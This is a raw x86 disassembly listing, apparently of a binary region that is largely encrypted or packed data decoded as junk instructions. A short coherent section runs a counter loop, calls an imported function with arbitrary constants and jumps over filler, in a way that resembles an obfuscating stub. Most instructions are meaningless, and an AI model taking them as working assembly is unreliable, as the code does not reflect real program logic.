  404792:	bound  esp,QWORD PTR [ebp-0x79]
  404795:	mov    al,ds:0xe83fdc8
  40479a:	mov    DWORD PTR [ebx-0x71],ebx
  40479d:	loopne 0x4047f5
  40479f:	mov    bl,0xe0
  4047a1:	loop   0x404776
  4047a3:	cld    
  4047a4:	push   ss
  4047a5:	mov    ch,0xb7
  4047a7:	dec    edi
  4047a8:	dec    edx
  4047a9:	pop    eax
  4047aa:	mov    al,ds:0x34e5b15b
  4047af:	sub    eax,DWORD PTR [ebx-0x316ac456]
  4047b5:	scas   eax,DWORD PTR es:[edi]
  4047b6:	ficom  DWORD PTR [ebx+0x16]
  4047b9:	or     bh,BYTE PTR [edi]
  4047bb:	or     ch,BYTE PTR [ebp-0x238acf53]
  4047c1:	push   0xfffffff1
  4047c3:	pop    ebx
  4047c4:	dec    ecx
  4047c5:	dec    esi
  4047c6:	cmp    BYTE PTR [eax+0x58ea8ac],0x11
  4047cd:	mov    ebx,0xcb420965
  4047d2:	and    esi,DWORD PTR [ecx+0x7b]
  4047d5:	add    DWORD PTR [eax],esi
  4047d7:	mov    edi,0x52aa7109
  4047dc:	das    
  4047dd:	jp     0x40476d
  4047df:	test   BYTE PTR [ebx+0x2f229b1d],dl
  4047e5:	sbb    eax,DWORD PTR [esi+0x7a]
  4047e8:	scas   al,BYTE PTR es:[edi]
  4047e9:	bound  ecx,QWORD PTR [ecx-0x18]
  4047ec:	mov    cl,0x5b
  4047ee:	mov    edx,0x22e266b1
  4047f3:	iret   
  4047f4:	jp     0x4047fa
  4047f6:	sub    eax,DWORD PTR [ebp-0x20]
  4047f9:	inc    edx
  4047fa:	mov    eax,ds:0x155a3ef5
  4047ff:	pop    ebp
  404800:	pusha  
  404801:	fcomp  DWORD PTR ss:[esi]
  404804:	dec    ebx
  404805:	add    BYTE PTR [edi+ecx*2],dh
  404808:	mov    ah,0xe0
  40480a:	push   ebp
  40480b:	cmc    
  40480c:	out    dx,al
  40480d:	ret    
  40480e:	or     al,0xa2
  404810:	out    dx,al
  404811:	sub    al,ch
  404813:	call   0xbba7:0x9f460e1c
  40481a:	push   esp
  40481b:	rol    BYTE PTR [ebx-0x1f35e600],0x14
  404822:	loop   0x404878
  404824:	stos   DWORD PTR es:[edi],eax
  404825:	rol    edi,1
  404827:	and    eax,edx
  404829:	loopne 0x404874
  40482b:	rol    BYTE PTR [esi],0x35
  40482e:	je     0x40483d
  404830:	fisub  WORD PTR [ebx+ecx*1-0x19c001a4]
  404837:	jl     0x404858
  404839:	cdq    
  40483a:	cli    
  40483b:	xchg   esp,eax
  40483c:	push   edx
  40483d:	mov    fs,WORD PTR [edi+0x1e]
  404840:	jmp    0xbc82:0x6ba3537c
  404847:	sbb    eax,0xb079a18f
  40484c:	adc    al,ch
  40484e:	mov    ebp,0x830386e6
  404853:	or     BYTE PTR ds:[eax+0x1f],bh
  404857:	(bad)  
  404858:	gs daa 
  40485a:	ds mov ebp,0x2921d066
  404860:	shl    BYTE PTR [esi-0xc],1
  404863:	bound  edi,QWORD PTR [esi]
  404865:	sbb    DWORD PTR [edx-0x12],esi
  404868:	add    ch,BYTE PTR [edx+0x2c]
  40486b:	or     ah,BYTE PTR [edi+esi*1-0x6e3fd9fc]
  404872:	call   0xec1991b0
  404877:	sub    esi,DWORD PTR [ecx]
  404879:	mov    edi,0xb2bbcbf3
  40487e:	pop    ss
  40487f:	or     BYTE PTR [ebx+0x33],dl
  404882:	pusha  
  404883:	leave  
  404884:	adc    bl,ch
  404886:	int    0x8d
  404888:	adc    DWORD PTR [esi+0x51],eax
  40488b:	sbb    eax,0x7073d
  404890:	daa    
  404891:	sbb    BYTE PTR [ecx+0x6],bh
  404894:	fisubr DWORD PTR [eax-0x24018cd5]
  40489a:	loopne 0x404889
  40489c:	adc    esp,edx
  40489e:	xchg   BYTE PTR [ebx],ah
  4048a0:	push   esp
  4048a1:	push   ds
  4048a2:	imul   ebx,DWORD PTR [esi-0x2f],0xffffffa2
  4048a6:	push   esp
  4048a7:	stos   BYTE PTR es:[edi],al
  4048a8:	mov    eax,0x2bbbf4da
  4048ad:	sbb    al,0x9b
  4048af:	mov    ebx,0xbbc35195
  4048b4:	or     DWORD PTR ds:0xe20d05e7,edx
  4048ba:	and    DWORD PTR [ebx+0x6550b84f],esi
  4048c0:	push   ds
  4048c1:	xchg   ecx,eax
  4048c2:	gs mov ch,0xf6
  4048c5:	in     eax,0xd6
  4048c7:	mov    ch,0xbb
  4048c9:	push   ecx
  4048ca:	test   BYTE PTR [eax+0x41e3b81d],0xdc
  4048d1:	clc    
  4048d2:	pop    ss
  4048d3:	call   0x72215ada
  4048d8:	xlat   BYTE PTR ds:[ebx]
  4048d9:	xor    al,BYTE PTR [ebp-0x22858fbb]
  4048df:	push   0x3ffcddcb
  4048e4:	daa    
  4048e5:	test   al,bl
  4048e7:	jp     0x404886
  4048e9:	stos   BYTE PTR es:[edi],al
  4048ea:	mov    eax,0x16d271c2
  4048ef:	(bad)  
  4048f0:	in     al,0x87
  4048f2:	mov    WORD PTR [eax+0x8],fs
  4048f5:	adc    ch,BYTE PTR [ecx+0x7e]
  4048f8:	nop
  4048f9:	dec    ebp
  4048fa:	xor    eax,0xf7a58ef6
  4048ff:	pop    ss
  404900:	test   eax,0x444cfa6d
  404905:	ins    BYTE PTR es:[edi],dx
  404906:	in     eax,0xc0
  404908:	push   esp
  404909:	inc    edi
  40490a:	inc    ebx
  40490b:	lods   eax,DWORD PTR ds:[esi]
  40490c:	repz inc edx
  40490e:	inc    edx
  40490f:	jle    0x40498a
  404911:	sub    DWORD PTR [ebx+eiz*4],0xffffffb5
  404915:	mov    eax,ds:0x1a837772
  40491a:	stos   DWORD PTR es:[edi],eax
  40491b:	adc    BYTE PTR [ebp+0x10],ah
  40491e:	or     bh,BYTE PTR [ebp-0x3]
  404921:	jmp    0xafb4:0x4c65cbaa
  404928:	push   esi
  404929:	out    dx,eax
  40492a:	fst    DWORD PTR [ecx-0x1e563cd4]
  404930:	mov    esp,0x53c5b8db
  404935:	xchg   ebx,eax
  404936:	mov    ecx,0x2a048d94
  40493b:	pmuludq mm6,QWORD PTR [ecx+0x45]
  40493f:	enter  0x4072,0x7c
  404943:	lods   eax,DWORD PTR ds:[esi]
  404944:	cdq    
  404945:	mov    ah,0xeb
  404947:	push   eax
  404948:	test   esi,ecx
  40494a:	js     0x404931
  40494c:	pop    esi
  40494d:	ins    DWORD PTR es:[edi],dx
  40494e:	mov    ebx,0x488f7966
  404953:	jbe    0x40491b
  404955:	adc    eax,0x495091de
  40495a:	sbb    al,0x3b
  40495c:	jae    0x4049cc
  40495e:	nop
  40495f:	fcomip st,st(6)
  404961:	pusha  
  404962:	shr    ch,cl
  404964:	bound  ebx,QWORD PTR [edx+edi*4-0x33]
  404968:	outs   dx,BYTE PTR ds:[esi]
  404969:	mov    esp,0x1ba50a65
  40496e:	gs popf 
  404970:	jo     0x404960
  404972:	test   eax,0x5e396393
  404977:	dec    esp
  404978:	mov    cx,0x10db
  40497c:	mov    ecx,0x90de5e44
  404981:	add    BYTE PTR [esi+0x32],ah
  404984:	adc    eax,0xd55b2749
  404989:	pop    esp
  40498a:	lods   eax,DWORD PTR ds:[esi]
  40498b:	dec    edx
  40498c:	pop    ss
  40498d:	aas    
  40498e:	cmp    ebp,DWORD PTR es:[ebp-0x6866486b]
  404995:	adc    bh,al
  404997:	cmp    dh,BYTE PTR [eax]
  404999:	fwait
  40499a:	dec    ecx
  40499b:	pop    edi
  40499c:	sub    BYTE PTR [eax+ecx*4-0x80],ch
  4049a0:	lds    esp,FWORD PTR [edx+0x59]
  4049a3:	dec    ebx
  4049a4:	(bad)
  4049a8:	xlat   BYTE PTR ds:[ebx]
  4049a9:	mov    dh,BYTE PTR [edi+0x440bcbc6]
  4049af:	cs cwde 
  4049b1:	push   edi
  4049b2:	cmp    ah,BYTE PTR [esi+edi*4]
  4049b5:	(bad)  
  4049b6:	fs out dx,al
  4049b8:	daa    
  4049b9:	ror    ebp,cl
  4049bb:	sub    eax,0xee9dad03
  4049c0:	mov    ah,0x5f
  4049c2:	icebp  
  4049c3:	into   
  4049c4:	sbb    bh,BYTE PTR [edi+0x3c7e8f78]
  4049ca:	out    dx,al
  4049cb:	int3   
  4049cc:	mov    BYTE PTR [edx-0x1dde3fb7],bh
  4049d2:	cli    
  4049d3:	out    dx,al
  4049d4:	imul   ecx,edi,0x88dfabb
  4049da:	aaa    
  4049db:	and    eax,0xfdbd197e
  4049e0:	imul   eax,DWORD PTR [esi-0x585e24fb],0x5d9eb0be
  4049ea:	cmp    DWORD PTR [ebp-0x19],edi
  4049ed:	push   ebx
  4049ee:	in     al,dx
  4049ef:	icebp  
  4049f0:	das    
  4049f1:	adc    bl,BYTE PTR [eax]
  4049f3:	enter  0x8356,0x52
  4049f7:	outs   dx,BYTE PTR ds:[esi]
  4049f8:	dec    ecx
  4049f9:	popf   
  4049fa:	or     BYTE PTR [edi],bh
  4049fc:	call   0x5720eccd
  404a01:	mov    BYTE PTR [ebx],ch
  404a03:	mov    edi,0x6e1b43d6
  404a08:	(bad)  
  404a0a:	mov    ebp,0x9df07b53
  404a0f:	sbb    DWORD PTR [edi-0x4a],ebp
  404a12:	mov    eax,esi
  404a14:	xor    al,0x8d
  404a16:	scas   eax,DWORD PTR es:[edi]
  404a17:	dec    esp
  404a18:	sub    BYTE PTR [ecx-0x2a211b42],dh
  404a1e:	jecxz  0x4049cd
  404a20:	xor    ah,ah
  404a22:	std    
  404a23:	div    BYTE PTR [eax+edx*2-0x607fccd6]
  404a2a:	mov    dh,0x83
  404a2c:	jge    0x4049e3
  404a2e:	in     al,0xcf
  404a30:	push   ss
  404a31:	retf   0x69f0
  404a34:	inc    ebp
  404a35:	inc    edx
  404a36:	jo     0x404a78
  404a38:	outs   dx,DWORD PTR ds:[esi]
  404a39:	mov    bl,0x54
  404a3b:	addr16 mov dl,0x41
  404a3e:	cld    
  404a3f:	mov    ds:0x57b87092,al
  404a44:	data16 fwait
  404a46:	mov    al,ds:0x53291265
  404a4b:	mov    bl,0xea
  404a4d:	mov    ecx,0x7510850
  404a52:	and    DWORD PTR ds:0x42a839,0x0
  404a5c:	mov    esi,DWORD PTR ds:0x42a839
  404a62:	inc    esi
  404a63:	mov    DWORD PTR ds:0x42a839,esi
  404a69:	cmp    DWORD PTR ds:0x42a839,0xd
  404a70:	jne    0x404a9d
  404a76:	push   DWORD PTR [ebp-0x28]
  404a79:	push   0x69d2
  404a7e:	push   0x518b
  404a83:	push   0x83d6
  404a88:	push   0x4eb7
  404a8d:	push   0x680f
  404a92:	push   0x7bad
  404a97:	call   DWORD PTR ds:0x41d188
  404a9d:	cmp    DWORD PTR ds:0x42a839,0xc
  404aa4:	jne    0x404ab7
  404aaa:	mov    esi,DWORD PTR ds:0x42a839
  404ab0:	inc    esi
  404ab1:	mov    DWORD PTR ds:0x42a839,esi
  404ab7:	cmp    DWORD PTR ds:0x42a839,0x16
  404abe:	jb     0x404a5c
  404ac4:	xor    edx,ecx
  404ac6:	sub    esi,DWORD PTR ds:0x42a7fd
  404acc:	mov    esi,0x327298
  404ad1:	jmp    0x404dc1
  404ad6:	enter  0xc53c,0xd1
  404ada:	(bad)  
  404adc:	aam    0xc1
  404ade:	mov    ah,0xf9
  404ae0:	int3   
  404ae1:	push   edx
  404ae2:	out    dx,al
  404ae3:	inc    edx
  404ae4:	into   
  404ae5:	mov    es,WORD PTR [esi+0x2e]
  404ae8:	js     0x404b62
  404aea:	dec    ebp
  404aeb:	jle    0x404b65
  404aed:	js     0x404aa0
  404aef:	or     BYTE PTR [esi-0x41],al
  404af2:	mov    dl,0xe5
  404af4:	out    0x6e,eax
  404af6:	les    ecx,FWORD PTR [esi-0x409501cc]
  404afc:	adc    eax,DWORD PTR [edx+0x3]
  404aff:	jo     0x404b02
  404b01:	(bad)  
  404b02:	xor    ch,BYTE PTR [edx+0x13]
  404b05:	fsubr  QWORD PTR ds:0x71835fb2
  404b0b:	shr    BYTE PTR [ebx],cl
  404b0d:	scas   al,BYTE PTR es:[edi]
  404b0e:	xabort 0xee
  404b11:	cmp    eax,0x3ad2e52d
  404b16:	ret    0x8fc6
  404b19:	mov    ds:0xebb1dc5c,eax
  404b1e:	or     BYTE PTR [ebx+0x59],bh
  404b21:	jbe    0x404b35
  404b23:	fs aam 0x58
  404b26:	jmp    0x404ad8
  404b28:	inc    edx
  404b29:	inc    esp
  404b2a:	push   edi
  404b2b:	xchg   esp,eax
  404b2c:	push   ecx
  404b2d:	xchg   ecx,eax
  404b2e:	sbb    esi,DWORD PTR [ebp-0x53444473]
  404b34:	(bad)  
  404b35:	and    ebx,DWORD PTR [edx-0x54406a46]
  404b3b:	cmp    BYTE PTR [esi+0x54],ch
  404b3e:	inc    edx
  404b3f:	cmp    al,0x4d
  404b41:	jo     0x404ae3
  404b43:	inc    esp
  404b44:	mov    ecx,0xd01ce20
  404b49:	pop    edx
  404b4a:	int3   
  404b4b:	jle    0x404ba3
  404b4d:	add    eax,0x92e85a85
  404b52:	add    al,0x89
  404b54:	sbb    al,0x41
  404b56:	pop    ds
  404b57:	pop    ebp
  404b58:	jg     0x404b0a
  404b5a:	sub    al,0x1
  404b5c:	jns    0x404b80
  404b5e:	push   es
  404b5f:	mov    ss,ebp
  404b61:	mov    bl,0x73
  404b63:	lods   al,BYTE PTR ds:[esi]
  404b64:	sbb    dh,bl
  404b66:	bound  ebp,QWORD PTR [edx-0x37385ad7]
  404b6c:	mov    bl,0xda
  404b6e:	cmp    dh,BYTE PTR [ebx-0x2]
  404b71:	aas    
  404b72:	jb     0x404b8e
  404b74:	icebp  
  404b75:	mov    edi,0x49317143
  404b7a:	jl     0x404bbe
  404b7c:	fsub   QWORD PTR [ebx-0x62353f2f]
  404b82:	in     eax,0x2c
  404b84:	or     al,0x61
  404b86:	test   eax,esi
  404b88:	std    
  404b89:	push   edi
  404b8a:	adc    eax,0x5d81b8a0
  404b8f:	or     al,0x84
  404b91:	add    DWORD PTR [edx-0xb85bddd],ebp
  404b97:	shl    DWORD PTR [ebp+ecx*2-0x423a93f9],cl
  404b9e:	aaa    
  404b9f:	xchg   DWORD PTR [ecx],ebx
  404ba1:	les    edi,FWORD PTR [edx-0x64a5b73c]
  404ba7:	fwait
  404ba8:	or     BYTE PTR [edi+0x1b71e149],bl
  404bae:	sbb    DWORD PTR [ebx-0x6ce4b2a],0xffffffe9
  404bb5:	popf   
  404bb6:	dec    edi
  404bb7:	rol    DWORD PTR [edi],1
  404bb9:	jbe    0x404b65
  404bbb:	mov    eax,0x7639ac67
  404bc0:	mov    bh,0x1
  404bc2:	inc    edi
  404bc3:	sub    bh,0x67
  404bc6:	sar    DWORD PTR [ecx],1
  404bc8:	adc    al,BYTE PTR [eax-0x14]
  404bcb:	pop    ds
  404bcc:	adc    BYTE PTR [ebp-0x3342d405],cl
  404bd2:	(bad)  
  404bd3:	xchg   ebp,eax
  404bd4:	add    dh,BYTE PTR [edi-0x4814ed9]
  404bda:	sbb    eax,DWORD PTR [ecx]
  404bdc:	popa   
  404bdd:	xchg   edi,eax
  404bde:	je     0x404bbc
  404be0:	adc    BYTE PTR [eax+edi*1-0x29],ah
  404be4:	addps  xmm0,XMMWORD PTR [esi-0x59]
  404be8:	call   0x7cde756e
  404bed:	mov    dl,0xa2
  404bef:	mov    edi,0xf7e49826
  404bf4:	cwde   
  404bf5:	or     ebp,DWORD PTR [esi-0x8265f86]
  404bfb:	jno    0x404b97
  404bfd:	xchg   edi,eax
  404bfe:	xchg   BYTE PTR [ecx-0x12],dh
  404c01:	jle    0x404bf0
  404c03:	jne    0x404c41
  404c05:	xor    dl,BYTE PTR [edx]
  404c07:	jg     0x404c0b
  404c09:	ds mov ds,ebx
  404c0c:	das    
  404c0d:	sbb    dl,BYTE PTR [edx+ebx*4+0x23]
  404c11:	xor    edx,DWORD PTR [edi]
  404c13:	aad    0x87
  404c15:	push   eax
  404c16:	pop    esp
  404c17:	mov    ah,0x57
  404c19:	push   cs
  404c1a:	or     al,0x88
  404c1c:	int3   
  404c1d:	nop
  404c1e:	xor    eax,0x5756fd4e
  404c23:	mov    eax,0x379b77e9
  404c28:	retf   
  404c29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c2a:	shl    BYTE PTR [ebx],0x24
  404c2d:	xchg   ecx,eax
  404c2e:	xchg   ecx,eax
  404c2f:	loope  0x404c7b
  404c31:	sar    BYTE PTR [esp+eiz*2+0x36],0xeb
  404c36:	pushf  
  404c37:	popa   
  404c38:	loop   0x404bdc
  404c3a:	sbb    eax,0xd7ec0b6a
  404c3f:	out    0x9e,eax
  404c41:	jno    0x404bd8
  404c43:	mov    ecx,DWORD PTR ds:0x9d4a93e4
  404c49:	push   ebp
  404c4a:	popf   
  404c4b:	inc    esi
  404c4c:	hlt    
  404c4d:	jb     0x404c51
  404c4f:	cmp    ecx,esi
  404c51:	scas   al,BYTE PTR es:[edi]
  404c52:	leave  
  404c53:	xor    edx,edx
  404c55:	cld    
  404c56:	add    eax,0x9723f84
  404c5b:	pop    ebp
  404c5c:	push   eax
  404c5d:	cmp    edx,DWORD PTR [edx]
  404c5f:	push   ebx
  404c60:	xchg   ecx,eax
  404c61:	ret    0x2294
  404c64:	mov    bl,0x56
  404c66:	adc    DWORD PTR [esi-0x63ccfa23],0x1b0c6e27
  404c70:	in     al,0xa
  404c72:	sbb    eax,0x7528d27
  404c77:	push   cs
  404c78:	sbb    DWORD PTR [edi+0x35fcfb51],esi
  404c7e:	adc    BYTE PTR [edi+eiz*2+0x3621a3e2],0xc5
  404c86:	je     0x404c3a
  404c88:	jne    0x404c8a
  404c8a:	jno    0x404c2d
  404c8c:	or     DWORD PTR [edi+0x73],edi
  404c8f:	xchg   BYTE PTR ds:0xda798ec0,dl
  404c95:	pushf  
  404c96:	adc    DWORD PTR [ecx],ecx
  404c98:	jl     0x404c7e
  404c9a:	(bad)  
  404c9b:	bound  edx,QWORD PTR [edi+0x3554983]
  404ca1:	pop    ebp
  404ca2:	jnp    0x404c65
  404ca4:	stc    
  404ca5:	(bad)  
  404ca6:	jmp    DWORD PTR [ecx]
  404ca8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ca9:	push   ebp
  404caa:	inc    ebx
  404cab:	xchg   esp,eax
  404cac:	out    0x23,al
  404cae:	cmp    cl,BYTE PTR [eax]
  404cb0:	rcl    cl,1
  404cb2:	adc    BYTE PTR [edi],0xf8
  404cb5:	mov    BYTE PTR [esi+edx*8+0x5b],ch
  404cb9:	lods   eax,DWORD PTR ds:[esi]
  404cba:	sub    bl,BYTE PTR [edx-0x491021ec]
  404cc0:	pushf  
  404cc1:	or     edx,DWORD PTR [si+0x6ec3]
  404cc6:	enter  0x9d72,0xfc
  404cca:	lea    ecx,[esi]
  404ccc:	mov    eax,ds:0x235fa3a0
  404cd1:	jmp    0x972c:0xa0d07b1a
  404cd8:	push   esp
  404cd9:	push   ebx
  404cda:	lock mov esp,0xe9f48ed8
  404ce0:	into   
  404ce1:	aas    
  404ce2:	xlat   BYTE PTR ds:[ebx]
  404ce3:	rcl    dl,cl
  404ce5:	push   es
  404ce6:	xor    DWORD PTR [esi-0x19ca572a],0xffffffd4
  404ced:	pop    es
  404cee:	xchg   esi,eax
  404cef:	sbb    DWORD PTR [eax],ebp
  404cf1:	sub    dh,BYTE PTR [esi+ecx*4+0x725696cc]
  404cf8:	es inc ebx
  404cfa:	adc    ebp,DWORD PTR [ebp-0x6f]
  404cfd:	stc    
  404cfe:	sbb    al,0x44
  404d00:	clc    
  404d01:	pop    es
  404d02:	pop    edi
  404d03:	rcl    DWORD PTR [ebx+esi*2-0x4031cb4d],0xcf
  404d0b:	jg     0x404d44
  404d0d:	leave  
  404d0e:	mov    al,ds:0x3724a382
  404d13:	pop    edi
  404d14:	sar    al,1
  404d16:	leave  
  404d17:	push   ds
  404d18:	iret   
  404d19:	dec    esp
  404d1a:	pop    esp
  404d1b:	dec    esp
  404d1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d1d:	je     0x404d24
  404d1f:	sub    ah,dh
  404d21:	or     dh,BYTE PTR [edi+0x62e90695]
  404d27:	retf   
  404d28:	push   ecx
  404d29:	sbb    ebx,edi
  404d2b:	stos   DWORD PTR es:[edi],eax
  404d2c:	push   ecx
  404d2d:	or     al,0x8e
  404d2f:	test   eax,0x77223b98
  404d34:	xchg   edx,eax
  404d35:	ror    BYTE PTR [ebp-0x34],0x18
  404d39:	jns    0x404cbb
  404d3b:	sub    ebx,DWORD PTR [esi-0x38]
  404d3e:	popf   
  404d3f:	xchg   BYTE PTR [edx+0x48],al
  404d42:	test   al,0xcd
  404d44:	and    DWORD PTR [edx+0x338d5eb5],eax
  404d4a:	iret   
  404d4b:	jmp    0x404da3
  404d4d:	xor    BYTE PTR [ebp-0x71a36d0],ch
  404d53:	lds    ecx,FWORD PTR [ebx+0x1a]
  404d56:	aaa    
  404d57:	out    0xf2,eax
  404d59:	and    bl,BYTE PTR [eax+0x71]
  404d5c:	adc    ebx,edi
  404d5e:	test   eax,0x280e87ac
  404d63:	mov    edx,0x97d48b58
  404d68:	test   BYTE PTR [ebx+0x573f8155],0x1c
  404d6f:	je     0x404d2a
  404d71:	hlt    
  404d72:	and    al,0x2a
  404d74:	push   es
  404d75:	add    ecx,esi
  404d77:	xchg   ebx,eax
  404d78:	xor    DWORD PTR [eax-0x6eecd1d1],esp
  404d7e:	inc    ecx
  404d7f:	scas   eax,DWORD PTR es:[edi]
  404d80:	xchg   edi,eax
  404d81:	jnp    0x404d9d
  404d83:	xor    eax,0xe74f9345
  404d88:	add    al,0xee
  404d8a:	and    dl,BYTE PTR [ebx+0x709e1cc3]
  404d90:	(bad)  
  404d91:	test   BYTE PTR ds:0xe01cc818,ah
  404d97:	pop    es
  404d98:	dec    ecx
  404d99:	pop    es
  404d9a:	cmp    edi,esp
  404d9c:	fld    DWORD PTR [esi]
  404d9e:	outs   dx,BYTE PTR fs:[esi]
  404da0:	sbb    BYTE PTR [edi+eiz*4+0x2a8781b2],ch
  404da7:	div    DWORD PTR [edx-0x1b5a8f34]
  404dad:	dec    edx
  404dae:	inc    esi
  404daf:	sbb    ah,dh
  404db1:	xor    eax,0x8249c2f9
  404db6:	jbe    0x404dbd
  404db8:	outs   dx,DWORD PTR ds:[esi]
  404db9:	or     al,0x3
  404dbb:	cli    
  404dbc:	daa    
  404dbd:	shl    DWORD PTR [ecx],1
  404dbf:	sbb    al,0x9
  404dc1:	push   edi
  404dc2:	mov    edi,DWORD PTR [ebp+0x10]
  404dc5:	add    edx,esi
  404dc7:	cmp    edi,edx
  404dc9:	je     0x405a02
  404dcf:	mov    edx,DWORD PTR [ebp-0x8]
  404dd2:	mov    eax,DWORD PTR [ebp-0x4]
  404dd5:	xor    eax,ecx
  404dd7:	jmp    0x4050c7
  404ddc:	(bad)
  404ddf:	rcl    cl,0xd4
  404de2:	leave  
  404de3:	aad    0x26
  404de5:	xor    dh,BYTE PTR [esp+edx*2]
  404de8:	mov    dl,0x3b
  404dea:	(bad)  
  404deb:	leave  
  404dec:	fwait
  404ded:	xor    edi,DWORD PTR [eax+0x78]
  404df0:	dec    ebp
  404df1:	jle    0x404e6b
  404df3:	js     0x404dc6
  404df5:	stc    
  404df6:	xchg   esi,eax
  404df7:	xor    esi,DWORD PTR [ebx+0x24d218bd]
  404dfd:	mov    eax,ds:0xfccf85f1
  404e02:	pusha  
  404e03:	inc    edi
  404e04:	add    eax,0xf92e68fe
  404e09:	jno    0x404e15
  404e0b:	push   0x5b9c81e7
  404e10:	data16 js 0x404e6b
  404e13:	xchg   edi,eax
  404e14:	in     eax,0xb5
  404e16:	jbe    0x404dff
  404e18:	inc    ecx
  404e19:	jp     0x404e79
  404e1b:	clc    
  404e1c:	(bad)  
  404e1d:	icebp  
  404e1e:	data16 (bad) 
  404e20:	fsubr  DWORD PTR ds:0x9facc97f
  404e26:	push   edx
  404e27:	sbb    DWORD PTR [esi],ebx
  404e29:	mov    bh,0x1d
  404e2b:	cmp    DWORD PTR [ebx+edi*8+0x7c392b5b],esi
  404e32:	mov    edx,0x15e440e6
  404e37:	mov    ss,WORD PTR [esi]
  404e39:	scas   eax,DWORD PTR es:[edi]
  404e3a:	vmread DWORD PTR [edx-0x70892286],ebp
  404e41:	push   es
  404e42:	push   edx
  404e43:	xchg   BYTE PTR [ecx-0x382df38e],bh
  404e49:	inc    esp
  404e4a:	xor    bh,BYTE PTR [esi+0x2bfd09a2]
  404e50:	dec    ebp
  404e51:	push   es
  404e52:	(bad)  
  404e53:	push   esi
  404e54:	xchg   BYTE PTR [edi],ch
  404e56:	push   ebx
  404e57:	pop    edi
  404e58:	aad    0x9b
  404e5a:	stos   BYTE PTR es:[edi],al
  404e5b:	pop    esp
  404e5c:	jmp    0x2d54:0x39b48685
  404e63:	lea    ebx,[eax]
  404e65:	push   eax
  404e66:	jp     0x404e1e
  404e68:	or     eax,0x546adc38
  404e6d:	stos   BYTE PTR es:[edi],al
  404e6e:	cs jno 0x404e15
  404e71:	icebp  
  404e72:	dec    edx
  404e73:	adc    eax,0xcc4ba670
  404e78:	inc    ebp
  404e79:	(bad)  
  404e7a:	xor    eax,0x6d42032
  404e7f:	mov    ds:0x7e1cb254,eax
  404e84:	cwde   
  404e85:	xor    DWORD PTR [ecx+0x1],ebx
  404e88:	sbb    esp,DWORD PTR [ebp+0x6db74a36]
  404e8e:	sbb    ch,BYTE PTR [ebx-0x22]
  404e91:	je     0x404ea0
  404e93:	aas    
  404e94:	xor    BYTE PTR [ebp-0x2d],ah
  404e97:	and    eax,0xc6f5ba2a
  404e9c:	fwait
  404e9d:	sbb    BYTE PTR [ecx-0x36],cl
  404ea0:	or     edx,DWORD PTR [ebp-0x15]
  404ea3:	or     al,0x96
  404ea5:	cdq    
  404ea6:	add    ah,BYTE PTR [ecx+0x287fb32e]
  404eac:	ss xchg esi,eax
  404eae:	jp     0x404ed3
  404eb0:	mov    BYTE PTR [esi+0x56],0xf1
  404eb4:	mov    bl,0x45
  404eb6:	lods   al,BYTE PTR ds:[esi]
  404eb7:	popa   
  404eb8:	pop    esi
  404eb9:	ins    BYTE PTR es:[edi],dx
  404eba:	rcl    BYTE PTR [eiz*4+0x38992eac],0xe2
  404ec2:	popf   
  404ec3:	rcl    ebp,cl
  404ec5:	sbb    eax,0xda8af69a
  404eca:	sar    DWORD PTR [edi+0x14],0x81
  404ece:	sbb    bl,ch
  404ed0:	test   eax,0xfc307ddf
  404ed5:	inc    ebp
  404ed6:	nop
  404ed7:	xchg   edx,eax
  404ed8:	push   ss
  404ed9:	pop    ebx
  404eda:	and    BYTE PTR [ebx-0x26acd483],ah
  404ee0:	fsubr  QWORD PTR [edx]
  404ee2:	push   0x8b8d9ccf
  404ee7:	mov    ah,0x2b
  404ee9:	out    0x7f,eax
  404eeb:	mov    ch,0xe3
  404eed:	into   
  404eee:	test   eax,0xe195abf3
  404ef3:	mov    ebx,0x36158d5e
  404ef8:	mov    ch,dl
  404efa:	imul   BYTE PTR [edx]
  404efc:	pop    ebp
  404efd:	ss (bad) 
  404eff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404f00:	add    DWORD PTR [edi+ebp*1],eax
  404f03:	mov    BYTE PTR [ebx-0xd],ch
  404f06:	retf   0x5ac2
  404f09:	fidivr WORD PTR [esi-0xe]
  404f0c:	xor    dh,BYTE PTR [esi]
  404f0e:	dec    edi
  404f0f:	push   ss
  404f10:	or     eax,0x8ec69788
  404f15:	dec    esp
  404f16:	add    DWORD PTR [edi+0x62],0xc67cf8e8
  404f1d:	xchg   esp,eax
  404f1e:	or     eax,0xbb7d7e09
  404f23:	ret    
  404f24:	outs   dx,DWORD PTR ds:[esi]
  404f25:	and    eax,0x8daeb369
  404f2a:	inc    esp
  404f2b:	jns    0x404f14
  404f2d:	jg     0x404f75
  404f2f:	push   esp
  404f30:	sub    dl,dl
  404f32:	outs   dx,BYTE PTR ds:[esi]
  404f33:	icebp  
  404f34:	sub    DWORD PTR [eax],edi
  404f36:	leave  
  404f37:	mov    ebp,0x7aa741d7
  404f3c:	pop    ebp
  404f3d:	pusha  
  404f3e:	jmp    0x1c3b:0x7d8b1eb8
  404f45:	clc    
  404f46:	and    BYTE PTR [edi],ah
  404f48:	jns    0x404f12
  404f4a:	xor    edi,DWORD PTR [edi+0x9]
  404f4d:	lock push cs
  404f4f:	test   eax,0x5c1c258c
  404f54:	mov    ds:0x717c455e,al
  404f59:	adc    BYTE PTR [ebx+0x5],0x6
  404f5d:	mov    al,0xe4
  404f5f:	inc    esi
  404f60:	mov    DWORD PTR ds:0x1cc782aa,ebp
  404f66:	jnp    0x404fba
  404f68:	jmp    FWORD PTR [ebx+0x17]
  404f6b:	lds    esp,FWORD PTR [edi-0x1c46830f]
  404f71:	jl     0x404efa
  404f73:	pop    sp
  404f75:	jg     0x404fde
  404f77:	fwait
  404f78:	pop    ss
  404f79:	inc    ecx
  404f7a:	or     al,0x91
  404f7c:	(bad)  
  404f7e:	sub    al,0x1f
  404f80:	out    0xb3,eax
  404f82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404f83:	bound  edi,QWORD PTR [eax+0x1b]
  404f86:	and    cl,BYTE PTR ds:0x160e971a
  404f8c:	push   ds
  404f8d:	aaa    
  404f8e:	lock sar BYTE PTR [ebx-0x13],1
  404f92:	push   ds
  404f93:	ja     0x404f84
  404f95:	mov    bh,0xce
  404f97:	xchg   edx,eax
  404f98:	adc    bh,BYTE PTR [ecx-0x7a]
  404f9b:	xor    ebx,DWORD PTR [eax-0x2b]
  404f9e:	and    BYTE PTR [edx],0x1
